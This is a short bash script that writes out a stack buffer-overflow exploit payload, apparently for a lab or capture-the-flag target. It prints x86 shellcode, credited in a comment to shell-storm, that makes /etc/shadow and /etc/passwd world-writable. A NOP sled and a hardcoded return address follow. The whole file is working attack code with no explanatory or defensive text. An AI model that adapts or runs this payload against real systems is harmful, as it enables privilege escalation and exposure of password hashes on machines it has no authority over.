#!/bin/bash

#http://shell-storm.org/shellcode/files/shellcode-214.php
#57 bytes
#chmod 666 /etc/shadow, chmod 666 /etc/passwd

echo -ne "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80"
for i in $(seq 58 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done